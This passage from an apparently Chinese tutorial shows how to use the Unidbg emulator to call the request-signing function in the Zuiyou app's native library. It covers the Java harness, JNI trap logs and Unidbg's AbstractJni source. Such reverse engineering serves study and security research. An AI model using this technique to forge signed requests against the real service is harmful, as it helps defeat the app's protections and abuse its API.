&#125;</code></pre><p>虚拟模块在本质上就是按模块去Hook和实现一些函数，只不过在形式和处理上更优雅，应该说是一个很好的设计。</p><p>它也并非万全之策，以libandroid.so为例，AndroidModule虚拟模块里一共实现了下面几个函数。</p><ul><li>AAssetManager_fromJava</li><li>AAsset_close</li><li>AAsset_getBuffer</li><li>AAsset_getLength</li><li>AAsset_read</li></ul><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705114440593.png" alt="image-20250705114440593"></p><p>和libandroid.so所具有的数百个导出函数相比，只是极小的一部分。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1667898041325-6e2aa628-67bb-48a2-acc8-bc9d35af4305.png" alt="img"></p><p>即使只考虑已处理的五个函数，它也远称不上完善，只是一种简单的模拟。libjnigraphics.so、libmediandk.so 也都存在同样的问题。</p><p>但在这个场景下，已经是最好的办法。</p><h3 id="四、发起调用"><a href="#四、发起调用" class="headerlink" title="四、发起调用"></a>四、发起调用</h3><p>可参考的代码如下：</p><pre><code class="language-Java">package com.test2;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import com.github.unidbg.virtualmodule.android.AndroidModule;import java.io.File;import java.nio.charset.StandardCharsets;public class TEST2 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmClass NetCrypto;    private final VM vm;    public TEST2() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;cn.xiaochuankeji.tieba&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test2\\right573.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        // 使用libandroid.so虚拟模块        new AndroidModule(emulator, vm).register(memory);        DalvikModule dm = vm.loadLibrary(&quot;net_crypto&quot;, true);        NetCrypto = vm.resolveClass(&quot;com.izuiyou.network.NetCrypto&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public String callSign() &#123;        String arg1 = &quot;hello world&quot;;        byte[] arg2 = &quot;V I 50&quot;.getBytes(StandardCharsets.UTF_8);        String ret = NetCrypto.callStaticJniMethodObject(emulator, &quot;sign(Ljava/lang/String;[B)Ljava/lang/String;&quot;, arg1, arg2).getValue().toString();        return ret;    &#125;    public static void main(String[] args) &#123;        TEST2 test = new TEST2();        String result = test.callSign();        System.out.println(&quot;call s result: &quot; + result);    &#125;&#125;</code></pre><p>因为是静态函数，而且返回值是字符串，所以采用<strong>callStaticJniMethodObject</strong>发起调用。</p><p>除此之外，参数1 和 2 是字符串和字节数组类型，都属于Unidbg会替我们处理类型转换的类型。</p><h3 id="五、补JNI环境"><a href="#五、补JNI环境" class="headerlink" title="五、补JNI环境"></a>五、补JNI环境</h3><p>本篇开始进入JNI补环境的处理逻辑，这里会留好几个坑，放到后文再讲，请读者稍安勿躁。</p><p>运行代码，报错如下：</p><pre><code class="language-shell">JNIEnv-&gt;GetStringUtfChars(&quot;hello world&quot;) was called from RX@0x12066b07[libnet_crypto.so]0x66b07JNIEnv-&gt;ReleaseStringUTFChars(&quot;hello world&quot;) was called from RX@0x12066b23[libnet_crypto.so]0x66b23JNIEnv-&gt;FindClass(com/izuiyou/common/base/BaseApplication) was called from RX@0x1204da21[libnet_crypto.so]0x4da21JNIEnv-&gt;GetStaticMethodID(com/izuiyou/common/base/BaseApplication.getAppContext()Landroid/content/Context;) =&gt; 0x2157b33c was called from RX@0x1204da57[libnet_crypto.so]0x4da57[15:23:19 214]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987556, svcNumber=0x170, PC=unidbg@0xfffe0794, LR=RX@0x1204db2f[libnet_crypto.so]0x4db2f, syscall=nulljava.lang.UnsupportedOperationException: com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodV(DvmMethod.java:59)at com.github.unidbg.linux.android.dvm.DalvikVM$113.handle(DalvikVM.java:1815)at com.github.unidbg.linux.ARM32SyscallHandler.hook(ARM32SyscallHandler.java:131)at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Unicorn.java:312)at com.github.unidbg.arm.backend.Unicorn2Backend.emu_start(Unicorn2Backend.java:389)at com.github.unidbg.AbstractEmulator.emulate(AbstractEmulator.java:378)at com.github.unidbg.thread.Function32.run(Function32.java:39)at com.github.unidbg.thread.MainTask.dispatch(MainTask.java:19)at com.github.unidbg.thread.UniThreadDispatcher.run(UniThreadDispatcher.java:165)at com.github.unidbg.thread.UniThreadDispatcher.runMainForResult(UniThreadDispatcher.java:97)at com.github.unidbg.AbstractEmulator.runMainForResult(AbstractEmulator.java:341)at com.github.unidbg.arm.AbstractARMEmulator.eFunc(AbstractARMEmulator.java:255)at com.github.unidbg.Module.emulateFunction(Module.java:163)at com.github.unidbg.linux.android.dvm.DvmObject.callJniMethod(DvmObject.java:135)at com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(DvmClass.java:316)at com.test2.TEST2.callSign(TEST2.java:47)at com.test2.TEST2.main(TEST2.java:58)</code></pre><p>首先，读者需要意识到，这并不是真正的“报错”，而是Unidbg为了提醒我们补JNI环境，主动抛出的异常。接下来首先讨论异常。</p><h4 id="5-1-异常"><a href="#5-1-异常" class="headerlink" title="5.1 异常"></a>5.1 异常</h4><p>报错可以分为两部分</p><p>第一部分</p><pre><code class="language-shell">[15:23:19 214]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987556, svcNumber=0x170, PC=unidbg@0xfffe0794, LR=RX@0x1204db2f[libnet_crypto.so]0x4db2f, syscall=null</code></pre><p>日志输出的位置是**[com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538)**<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705152744055.png" alt="image-20250705152744055"></p><p>可能会感到疑惑，为什么处理JNI的逻辑，其报错在 <strong>Arm32SyscallHandler</strong>，这似乎是系统调用的处理模块吧？</p><p>事实上，Unidbg正是凭此实现了对JNI的代理，首先它构造了<strong>JNIEnv</strong>和<strong>JavaVM</strong>这两个JNI中的关键结构，它们是指向JNI函数表的二级指针。在处理函数表时，Unidbg将函数都导向一个八字节的跳板函数。</p><pre><code class="language-c">svc #imm;bx lr;</code></pre><p>比如样本中so文件的<strong>ReleaseStringUTFChars</strong>函数<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705153939780.png" alt="image-20250705153939780"></p><p>汇编代码如下：</p><pre><code class="language-c">.text:00066B14                 LDR             R0, [R6].text:00066B16                 LDR.W           R3, [R0,#0x2A8].text:00066B1A                 MOV             R0, R6.text:00066B1C                 MOV             R1, R5.text:00066B1E                 MOV             R2, R4.text:00066B20                 BLX             R3</code></pre><p>在真实的Android环境中，这里通过R3跳到了<strong>ReleaseStringUTFChars</strong>位于libart.so的真正实现上。</p><p>在Unidbg里，则是落到我们的跳板函数上。</p><p>对于此处的<strong>ReleaseStringUTFChars</strong>函数，是下面两条</p><pre><code class="language-c">svc #0x1a1;bx lr;</code></pre><blockquote><p><strong>SVC</strong>是软中断，Unicorn等CPU模拟器会拦截这些中断，进而Unidbg可以接管这些中断，并对JNI调用做模拟。可是Unidbg如何分辨系统调用和JNI调用？毕竟系统调用也是通过<strong>SVC</strong>软中断发起。这就依赖于<strong>SVC</strong>后面跟着的数字，这里我们称之为<strong>imm</strong>。</p></blockquote><p>在系统调用的调用约定里，<strong>imm</strong>无实际意义，而且默认会使用0，即<strong>SVC 0</strong>，就像下面这样</p><pre><code class="language-c">.text:0004147C                 MOV             R12, R7.text:00041480                 LDR             R7, =0x142.text:00041484                 SVC             0</code></pre><p>因此，根据 <strong>imm</strong> 是否为0，Unidbg确认逻辑应该导向模拟的JNI函数还是模拟的系统调用。</p><p>换句话说，在Unidbg中，JNI函数被提升到了和系统调用相同的层级，因此JNI报错也发生在syscallHandler里面。</p><p>对于报错的这第一部分，有意义的是 <strong>LR</strong>，它即JNI跳板函数的返回地址，对应于样本发起JNI调用的位置。</p><pre><code class="language-shell">[15:23:19 214]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987556, svcNumber=0x170, PC=unidbg@0xfffe0794, LR=RX@0x1204db2f[libnet_crypto.so]0x4db2f, syscall=null</code></pre><p>第二部分是其余部分</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodV(DvmMethod.java:59)</code></pre><p>首先是Unidbg无法处理的函数其签名<strong>com&#x2F;izuiyou&#x2F;common&#x2F;base&#x2F;BaseApplication-&gt;getAppContext()Landroid&#x2F;content&#x2F;Context;</strong>，这个格式很清晰，即<strong>com&#x2F;izuiyou&#x2F;common&#x2F;base&#x2F;BaseApplication</strong>类的<strong>getAppContext</strong>方法。</p><p>再看它的调用栈，来自于<strong>callStaticObjectMethodV</strong>这个JNI方法。接下来讨论为什么要补JNI环境。</p><h4 id="5-2-补环境原因"><a href="#5-2-补环境原因" class="headerlink" title="5.2 补环境原因"></a>5.2 补环境原因</h4><p>为什么要补JNI环境？</p><p>上节讲到，Unidbg通过构造<strong>JNIEnv</strong>，<strong>JavaVM</strong>结构，辅之以<strong>SVC</strong>跳板函数，实现了对<strong>JNI</strong>的拦截和接管。</p><p>但到底如何去模拟JNI函数，这是问题的核心。Unidbg实现了一套JNI处理逻辑，当遇到JNI调用时，如果是<strong>FindClass</strong>、<strong>NewGlobalRef</strong>、<strong>GetObjectClass</strong>、<strong>GetMethodID</strong>、<strong>GetStringLength</strong>、<strong>GetStringChars</strong>、<strong>ReleaseStringChars</strong>等等函数，它都可以自洽处理，不需要使用者介入。</p><p>以GetStringLength为例，获取字符串长度，不需要使用者去做什么事。</p><pre><code class="language-Java">Pointer _GetStringLength = svcMemory.registerSvc(new ArmSvc() &#123;    @Override    public long handle(Emulator&lt;?&gt; emulator) &#123;        RegisterContext context = emulator.getContext();        UnidbgPointer object = context.getPointerArg(1);        DvmObject&lt;?&gt; string = getObject(object.toIntPeer());        String value = (String) Objects.requireNonNull(string).getValue();        return value.length();    &#125;&#125;);</code></pre><p>那么补JNI环境的需求在哪里？在于如果是<strong>callStaticObjectMethod</strong>、<strong>callObjectMethod</strong>、<strong>getObjectField</strong>、<strong>getStaticIntField</strong>等JNI函数，这些函数对样本的Java层数据做访问，Unidbg既未运行Dex，更没法运行Apk，因为需要借助使用者，去补充这些外部的信息。</p><p>因为担心用户意识不到补JNI的需求，所以通过抛出报错和打印堆栈予以提醒。</p><p>需要注意，并不是所有基于JNI发起的函数调用、字段访问都必须由用户处理，我们发现，其中有部分可以被预处理。举一些例子。</p><ul><li>Android PackageManager 类里的 GET_SIGNATURES 静态字段 ，它的值固定是 64</li><li>String 类的 getBytes 方法</li><li>List 实现类的 size 方法</li></ul><p>为了减少用户的补JNI负担，所以Unidbg预处理了数百个常见的JNI函数调用和字段访问，逻辑位于<strong>src&#x2F;main&#x2F;java&#x2F;com&#x2F;github&#x2F;unidbg&#x2F;linux&#x2F;android&#x2F;dvm&#x2F;AbstractJni.java</strong>类里。</p><p>比如<strong>callBooleanMethodV</strong>，调用和返回布尔值的实例方法，预处理了如下方法。</p><pre><code class="language-Java">@Overridepublic boolean callBooleanMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;    switch (signature) &#123;        case &quot;java/util/Enumeration-&gt;hasMoreElements()Z&quot;:            return ((Enumeration) dvmObject).hasMoreElements();        case &quot;java/util/ArrayList-&gt;isEmpty()Z&quot;:            return ((ArrayListObject) dvmObject).isEmpty();        case &quot;java/util/Iterator-&gt;hasNext()Z&quot;:            Object iterator = dvmObject.getValue();            if (iterator instanceof Iterator) &#123;                return ((Iterator&lt;?&gt;) iterator).hasNext();            &#125;        case &quot;java/lang/String-&gt;startsWith(Ljava/lang/String;)Z&quot;:&#123;            String str = (String) dvmObject.getValue();            StringObject prefix = vaList.getObjectArg(0);            return str.startsWith(prefix.value);        &#125;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>比如<strong>getObjectField</strong>，访问对象类型的实例字段，做了如下处理</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; getObjectField(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature) &#123;    if (&quot;android/content/pm/PackageInfo-&gt;signatures:[Landroid/content/pm/Signature;&quot;.equals(signature) &amp;&amp;            dvmObject instanceof PackageInfo) &#123;        PackageInfo packageInfo = (PackageInfo) dvmObject;        if (packageInfo.getPackageName().equals(vm.getPackageName())) &#123;            CertificateMeta[] metas = vm.getSignatures();            if (metas != null) &#123;                Signature[] signatures = new Signature[metas.length];                for (int i = 0; i &lt; metas.length; i++) &#123;                    signatures[i] = new Signature(vm, metas[i]);                &#125;                return new ArrayObject(signatures);            &#125;        &#125;    &#125;    if (&quot;android/content/pm/PackageInfo-&gt;versionName:Ljava/lang/String;&quot;.equals(signature) &amp;&amp;            dvmObject instanceof PackageInfo) &#123;        PackageInfo packageInfo = (PackageInfo) dvmObject;        if (packageInfo.getPackageName().equals(vm.getPackageName())) &#123;            String versionName = vm.getVersionName();            if (versionName != null) &#123;                return new StringObject(vm, versionName);            &#125;        &#125;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>这两个调用是获取Apk签名信息以及版本信息，Unidbg之所以能处理，依赖我们传入的APK，解析出了这些信息。</p><p>在AbstractJNI 中，下面四类处理为主</p><ul><li>App 基本信息与签名</li><li>JDK 加密解密与数字签名</li><li>字符串和容器类型</li><li>Android FrameWork 类库</li></ul><p>第一类就比如上面的两个，但不止于此，加载和解析APK让Unidbg获取了大量的信息。</p><p>比如处理获取包名：</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callStaticObjectMethod(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;    if (&quot;android/app/ActivityThread-&gt;currentPackageName()Ljava/lang/String;&quot;.equals(signature)) &#123;        String packageName = vm.getPackageName();        if (packageName != null) &#123;            return new StringObject(vm, packageName);        &#125;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>比如版本号：</p><pre><code class="language-Java">@Overridepublic int getIntField(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature) &#123;    if (&quot;android/content/pm/PackageInfo-&gt;versionCode:I&quot;.equals(signature)) &#123;        return (int) vm.getVersionCode();    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>第二类是Java加解密和数字签名相关的方法，它主要服务于Apk签名校验，出现频率很高。</p><p>比如：</p><pre><code class="language-Java">case &quot;java/security/KeyFactory-&gt;getInstance(Ljava/lang/String;)Ljava/security/KeyFactory;&quot;:&#123;    StringObject algorithm = vaList.getObjectArg(0);    assert algorithm != null;    try &#123;        return dvmClass.newObject(KeyFactory.getInstance(algorithm.value));    &#125; catch (NoSuchAlgorithmException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;case &quot;javax/crypto/Cipher-&gt;getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;&quot;:&#123;    StringObject transformation = vaList.getObjectArg(0);    assert transformation != null;    try &#123;        return dvmClass.newObject(Cipher.getInstance(transformation.value));    &#125; catch (NoSuchAlgorithmException | NoSuchPaddingException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;case &quot;java/security/MessageDigest-&gt;getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;&quot;: &#123;    StringObject type = vaList.getObjectArg(0);    assert type != null;    try &#123;        return dvmClass.newObject(MessageDigest.getInstance(type.value));    &#125; catch (NoSuchAlgorithmException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;</code></pre><p>比如：</p><pre><code class="language-Java">case &quot;javax/crypto/spec/SecretKeySpec-&gt;&lt;init&gt;([BLjava/lang/String;)V&quot;:&#123;    byte[] key = (byte[]) vaList.getObjectArg(0).value;    StringObject algorithm = vaList.getObjectArg(1);    assert algorithm != null;    SecretKeySpec secretKeySpec = new SecretKeySpec(key, algorithm.value);    return dvmClass.newObject(secretKeySpec);&#125;</code></pre><p>第三类是对基本类型的包装类、字符串、容器类型的处理。</p><p>比如：</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; newObject(BaseVM vm, DvmClass dvmClass, String signature, VarArg varArg) &#123;    switch (signature) &#123;        case &quot;java/lang/String-&gt;&lt;init&gt;([B)V&quot;:            ByteArray array = varArg.getObjectArg(0);            return new StringObject(vm, new String(array.getValue()));        case &quot;java/lang/String-&gt;&lt;init&gt;([BLjava/lang/String;)V&quot;:            array = varArg.getObjectArg(0);            StringObject string = varArg.getObjectArg(1);            try &#123;                return new StringObject(vm, new String(array.getValue(), string.getValue()));            &#125; catch (UnsupportedEncodingException e) &#123;                throw new IllegalStateException(e);            &#125;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>再比如：</p><pre><code class="language-Java">@Overridepublic boolean callBooleanMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;    switch (signature) &#123;        case &quot;java/util/Enumeration-&gt;hasMoreElements()Z&quot;:            return ((Enumeration) dvmObject).hasMoreElements();        case &quot;java/util/ArrayList-&gt;isEmpty()Z&quot;:            return ((ArrayListObject) dvmObject).isEmpty();        case &quot;java/util/Iterator-&gt;hasNext()Z&quot;:            Object iterator = dvmObject.getValue();            if (iterator instanceof Iterator) &#123;                return ((Iterator&lt;?&gt;) iterator).hasNext();            &#125;        case &quot;java/lang/String-&gt;startsWith(Ljava/lang/String;)Z&quot;:&#123;            String str = (String) dvmObject.getValue();            StringObject prefix = vaList.getObjectArg(0);            return str.startsWith(prefix.value);        &#125;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>再比如：</p><pre><code class="language-Java">case &quot;java/lang/Integer-&gt;intValue()I&quot;: &#123;    DvmInteger integer = (DvmInteger) dvmObject;    return integer.value;&#125;case &quot;java/util/List-&gt;size()I&quot;:    List&lt;?&gt; list = (List&lt;?&gt;) dvmObject.getValue();    return list.size();case &quot;java/util/Map-&gt;size()I&quot;:    Map&lt;?, ?&gt; map = (Map&lt;?, ?&gt;) dvmObject.getValue();    return map.size();</code></pre><p>比如：</p><pre><code class="language-Java">case &quot;java/util/ArrayList-&gt;remove(I)Ljava/lang/Object;&quot;: &#123;    int index = vaList.getIntArg(0);    ArrayListObject list = (ArrayListObject) dvmObject;    return list.value.remove(index);&#125;case &quot;java/util/List-&gt;get(I)Ljava/lang/Object;&quot;:    List&lt;?&gt; list = (List&lt;?&gt;) dvmObject.getValue();    return (DvmObject&lt;?&gt;) list.get(vaList.getIntArg(0));case &quot;java/util/Map-&gt;entrySet()Ljava/util/Set;&quot;:    Map&lt;?, ?&gt; map = (Map&lt;?, ?&gt;) dvmObject.getValue();    return vm.resolveClass(&quot;java/util/Set&quot;).newObject(map.entrySet());case &quot;java/util/Set-&gt;iterator()Ljava/util/Iterator;&quot;:    Set&lt;?&gt; set = (Set&lt;?&gt;) dvmObject.getValue();    return vm.resolveClass(&quot;java/util/Iterator&quot;).newObject(set.iterator());</code></pre><p>比如：</p><pre><code class="language-Java">case &quot;java/lang/String-&gt;getBytes()[B&quot;: &#123;    String str = (String) dvmObject.getValue();    return new ByteArray(vm, str.getBytes());&#125;case &quot;java/lang/String-&gt;getBytes(Ljava/lang/String;)[B&quot;:    String str = (String) dvmObject.getValue();    StringObject charsetName = vaList.getObjectArg(0);    assert charsetName != null;    try &#123;        return new ByteArray(vm, str.getBytes(charsetName.value));    &#125; catch (UnsupportedEncodingException e) &#123;        throw new IllegalStateException(e);    &#125;</code></pre><p>第四类是依赖于Android FrameWork的类库，它们没法在普通的Java环境里良好的处理，因此需要做一些粗糙的模拟或者占位。</p><p>比如Android系统服务</p><pre><code class="language-Java">case &quot;android/app/Application-&gt;getSystemService(Ljava/lang/String;)Ljava/lang/Object;&quot;: &#123;    StringObject serviceName = vaList.getObjectArg(0);    assert serviceName != null;    return new SystemService(vm, serviceName.getValue());</code></pre><p>SystemService 的实现如下，就是大量的简单占位，调用其中的方法实际获取数据时，还是要使用者来补。</p><pre><code class="language-Java">package com.github.unidbg.linux.android.dvm.api;import com.github.unidbg.arm.backend.BackendException;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.DvmObject;import com.github.unidbg.linux.android.dvm.VM;public class SystemService extends DvmObject&lt;String&gt; &#123;    public static final String WIFI_SERVICE = &quot;wifi&quot;;    public static final String CONNECTIVITY_SERVICE = &quot;connectivity&quot;;    public static final String TELEPHONY_SERVICE = &quot;phone&quot;;    public static final String ACCESSIBILITY_SERVICE = &quot;accessibility&quot;;    public static final String KEYGUARD_SERVICE = &quot;keyguard&quot;;    public static final String ACTIVITY_SERVICE = &quot;activity&quot;;    public static final String SENSOR_SERVICE = &quot;sensor&quot;;    public static final String INPUT_METHOD_SERVICE = &quot;input_method&quot;;    public static final String LOCATION_SERVICE = &quot;location&quot;;    public static final String WINDOW_SERVICE = &quot;window&quot;;    public static final String UI_MODE_SERVICE = &quot;uimode&quot;;    public static final String DISPLAY_SERVICE = &quot;display&quot;;    public static final String AUDIO_SERVICE = &quot;audio&quot;;        public SystemService(VM vm, String serviceName) &#123;        super(getObjectType(vm, serviceName), serviceName);    &#125;    private static DvmClass getObjectType(VM vm, String serviceName) &#123;        switch (serviceName) &#123;            case TELEPHONY_SERVICE:                return vm.resolveClass(&quot;android/telephony/TelephonyManager&quot;);            case WIFI_SERVICE:                return vm.resolveClass(&quot;android/net/wifi/WifiManager&quot;);            case CONNECTIVITY_SERVICE:                return vm.resolveClass(&quot;android/net/ConnectivityManager&quot;);            case ACCESSIBILITY_SERVICE:                return vm.resolveClass(&quot;android/view/accessibility/AccessibilityManager&quot;);            case KEYGUARD_SERVICE:                return vm.resolveClass(&quot;android/app/KeyguardManager&quot;);            case ACTIVITY_SERVICE:                return vm.resolveClass(&quot;android/os/BinderProxy&quot;); // android/app/ActivityManager            case SENSOR_SERVICE:                return vm.resolveClass(&quot;android/hardware/SensorManager&quot;);            case INPUT_METHOD_SERVICE:                return vm.resolveClass(&quot;android/view/inputmethod/InputMethodManager&quot;);            case LOCATION_SERVICE:                return vm.resolveClass(&quot;android/location/LocationManager&quot;);            case WINDOW_SERVICE:                return vm.resolveClass(&quot;android/view/WindowManager&quot;);            case UI_MODE_SERVICE:                return vm.resolveClass(&quot;android/app/UiModeManager&quot;);            case DISPLAY_SERVICE:                return vm.resolveClass(&quot;android/hardware/display/DisplayManager&quot;);            case AUDIO_SERVICE:                return vm.resolveClass(&quot;android/media/AudioManager&quot;);            default:                throw new BackendException(&quot;service failed: &quot; + serviceName);        &#125;    &#125;&#125;</code></pre><p>在过去几年的更新里，Unidbg 一直在对 AbstractJNI 做扩充，让它预处理更多的逻辑，减少用户的使用负担。</p><p>关于 AbstractJNI 可以做两点总结。</p><ol><li>确实能让我们免于一些补环境的苦恼</li><li>相较于所有可能的 JNI 访问，它只是杯水车薪，补 JNI 环境这个步骤不可避免。</li></ol><p>我们先看第一点，前两篇样本的处理，都没有遇到 JNI 补环境的需求，这就是 AbstractJNI 替我们代劳了。</p><p>比如第一篇文章的日志如下：</p><pre><code class="language-shell">JNIEnv-&gt;FindClass(android/app/ActivityThread) was called from RX@0x12010e20[liboasiscore.so]0x10e20JNIEnv-&gt;GetStaticMethodID(android/app/ActivityThread.currentApplication()Landroid/app/Application;) =&gt; 0xc1600375 was called from RX@0x12010f40[liboasiscore.so]0x10f40JNIEnv-&gt;CallStaticObjectMethodV(class android/app/ActivityThread, currentApplication() =&gt; android.app.Application@3d680b5a) was called from RX@0x120126cc[liboasiscore.so]0x126ccJNIEnv-&gt;FindClass(android/content/ContextWrapper) was called from RX@0x12011024[liboasiscore.so]0x11024JNIEnv-&gt;GetMethodID(android/content/ContextWrapper.getPackageManager()Landroid/content/pm/PackageManager;) =&gt; 0x53f2c391 was called from RX@0x12011050[liboasiscore.so]0x11050JNIEnv-&gt;CallObjectMethodV(android.app.Application@3d680b5a, getPackageManager() =&gt; android.content.pm.PackageManager@4b5d6a01) was called from RX@0x12012630[liboasiscore.so]0x12630JNIEnv-&gt;GetMethodID(android/content/ContextWrapper.getPackageName()Ljava/lang/String;) =&gt; 0x8bcc2d71 was called from RX@0x120110bc[liboasiscore.so]0x110bcJNIEnv-&gt;CallObjectMethodV(android.app.Application@3d680b5a, getPackageName() =&gt; &quot;com.sina.oasis&quot;) was called from RX@0x12012630[liboasiscore.so]0x12630JNIEnv-&gt;GetStringUtfChars(&quot;com.sina.oasis&quot;) was called from RX@0x12011108[liboasiscore.so]0x11108JNIEnv-&gt;GetMethodID(android/content/pm/PackageManager.getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;) =&gt; 0x3bca8377 was called from RX@0x12011168[liboasiscore.so]0x11168JNIEnv-&gt;CallObjectMethodV(android.content.pm.PackageManager@4b5d6a01, getPackageInfo(&quot;com.sina.oasis&quot;, 0x40) =&gt; android.content.pm.PackageInfo@3e2e18f2) was called from RX@0x12012630[liboasiscore.so]0x12630JNIEnv-&gt;GetFieldID(android/content/pm/PackageInfo.signatures [Landroid/content/pm/Signature;) =&gt; 0x25f17218 was called from RX@0x120111bc[liboasiscore.so]0x111bcJNIEnv-&gt;GetObjectField(android.content.pm.PackageInfo@3e2e18f2, signatures [Landroid/content/pm/Signature; =&gt; [android.content.pm.Signature@8f4ea7c]) was called from RX@0x120111d4[liboasiscore.so]0x111d4JNIEnv-&gt;GetObjectArrayElement([android.content.pm.Signature@8f4ea7c], 0) =&gt; android.content.pm.Signature@8f4ea7c was called from RX@0x120111ec[liboasiscore.so]0x111ecJNIEnv-&gt;GetMethodID(android/content/pm/Signature.toCharsString()Ljava/lang/String;) =&gt; 0x7a908191 was called from RX@0x1201122c[liboasiscore.so]0x1122cJNIEnv-&gt;CallObjectMethodV(android.content.pm.Signature@8f4ea7c, toCharsString() =&gt; &quot;30820295308201fea00302010202044b4ef1bf300d06092a864886f70d010105050030818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c74643020170d3130303131343130323831355a180f32303630303130323130323831355a30818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c746430819f300d06092a864886f70d010101050003818d00308189028181009d367115bc206c86c237bb56c8e9033111889b5691f051b28d1aa8e42b66b7413657635b44786ea7e85d451a12a82a331fced99c48717922170b7fc9bc1040753c0d38b4cf2b22094b1df7c55705b0989441e75913a1a8bd2bc591aa729a1013c277c01c98cbec7da5ad7778b2fad62b85ac29ca28ced588638c98d6b7df5a130203010001300d06092a864886f70d0101050500038181000ad4b4c4dec800bd8fd2991adfd70676fce8ba9692ae50475f60ec468d1b758a665e961a3aedbece9fd4d7ce9295cd83f5f19dc441a065689d9820faedbb7c4a4c4635f5ba1293f6da4b72ed32fb8795f736a20c95cda776402099054fccefb4a1a558664ab8d637288feceba9508aa907fc1fe2b1ae5a0dec954ed831c0bea4&quot;) was called from RX@0x12012630[liboasiscore.so]0x12630JNIEnv-&gt;GetStringUtfChars(&quot;30820295308201fea00302010202044b4ef1bf300d06092a864886f70d010105050030818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c74643020170d3130303131343130323831355a180f32303630303130323130323831355a30818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c746430819f300d06092a864886f70d010101050003818d00308189028181009d367115bc206c86c237bb56c8e9033111889b5691f051b28d1aa8e42b66b7413657635b44786ea7e85d451a12a82a331fced99c48717922170b7fc9bc1040753c0d38b4cf2b22094b1df7c55705b0989441e75913a1a8